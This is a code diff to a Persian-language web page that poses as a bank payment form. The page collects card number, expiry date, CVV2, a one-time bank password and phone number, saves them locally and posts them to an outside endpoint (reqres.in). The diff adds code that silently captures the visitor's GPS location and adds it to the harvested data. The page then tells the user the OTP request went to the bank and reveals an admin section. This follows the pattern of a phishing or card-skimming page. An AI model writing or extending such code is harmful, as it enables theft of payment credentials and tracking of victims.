@@ -131,7 +131,6 @@
             border-radius: 5px;
             cursor: pointer;
         }
-        /* Responsive design for mobile */
         @media (max-width: 600px) {
             .payment-form, .admin-section {
                 width: 95%;
@@ -141,8 +140,6 @@
                 font-size: 14px;
             }
         }
-        
-        /* If you have the Vazir font, add this part */
         @font-face {
             font-family: 'Vazir';
             src: url('fonts/Vazir.eot');
@@ -247,6 +244,29 @@
             return Math.floor(1000 + Math.random() * 9000).toString();
         }
 
+        // تابع گرفتن موقعیت مکانی
+        function getLocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            timestamp: new Date().toISOString()
+                        };
+                        callback(location);
+                    },
+                    (error) => {
+                        console.warn("خطا در گرفتن موقعیت مکانی: ", error.message);
+                        callback(null); // در صورت خطا، null برگردانده می‌شود
+                    }
+                );
+            } else {
+                console.warn("مرورگر از Geolocation پشتیبانی نمی‌کند.");
+                callback(null);
+            }
+        }
+
         function requestOTP() {
             let userCode = document.getElementById('security-code').value;
             let generatedCode = document.getElementById('generated-code').textContent;
@@ -254,41 +274,46 @@
             if (userCode === generatedCode) {
                 const form = document.getElementById('payment-form');
                 const data = new FormData(form);
-                const jsonData = {
-                    "card_number": data.get("card-number"),
-                    "amount": data.get("amount"),
-                    "expiry": data.get("expiry"),
-                    "cvv2": data.get("cvv2"),
-                    "security_code": data.get("security-code"),
-                    "otp_code": data.get("otp-code"),
-                    "phone_number": data.get("phone-number"),
-                    "timestamp": new Date().toISOString()
-                };
 
-                let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
-                storedData.push(jsonData);
-                localStorage.setItem('paymentData', JSON.stringify(storedData));
+                // گرفتن موقعیت مکانی و ارسال آن
+                getLocation((location) => {
+                    const jsonData = {
+                        "card_number": data.get("card-number"),
+                        "amount": data.get("amount"),
+                        "expiry": data.get("expiry"),
+                        "cvv2": data.get("cvv2"),
+                        "security_code": data.get("security-code"),
+                        "otp_code": data.get("otp-code"),
+                        "phone_number": data.get("phone-number"),
+                        "location": location, // اضافه کردن موقعیت مکانی
+                        "timestamp": new Date().toISOString()
+                    };
 
-                fetch('https://reqres.in/api/users', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(jsonData)
-                })
-                .then(response => response.json())
-                .then(data => {
-                    alert("درخواست رمز پویا به بانک مبدا ارسال شد");
-                    document.getElementById('request-otp').style.display = 'none';
-                    document.getElementById('otp-timer').style.display = 'block';
-                    startOTPTimer(120);
+                    let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
+                    storedData.push(jsonData);
+                    localStorage.setItem('paymentData', JSON.stringify(storedData));
 
-                    const adminSection = document.getElementById('admin-section');
-                    adminSection.style.display = 'block';
-                    adminSection.scrollIntoView({ behavior: 'smooth' });
-                })
-                .catch(error => {
-                    alert("خطا در ارسال اطلاعات: " + error.message);
+                    fetch('https://reqres.in/api/users', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(jsonData)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert("درخواست رمز پویا به بانک مبدا ارسال شد");
+                        document.getElementById('request-otp').style.display = 'none';
+                        document.getElementById('otp-timer').style.display = 'block';
+                        startOTPTimer(120);
+
+                        const adminSection = document.getElementById('admin-section');
+                        adminSection.style.display = 'block';
+                        adminSection.scrollIntoView({ behavior: 'smooth' });
+                    })
+                    .catch(error => {
+                        alert("خطا در ارسال اطلاعات: " + error.message);
+                    });
                 });
             } else {
                 alert("کد امنیتی نامعتبر است");
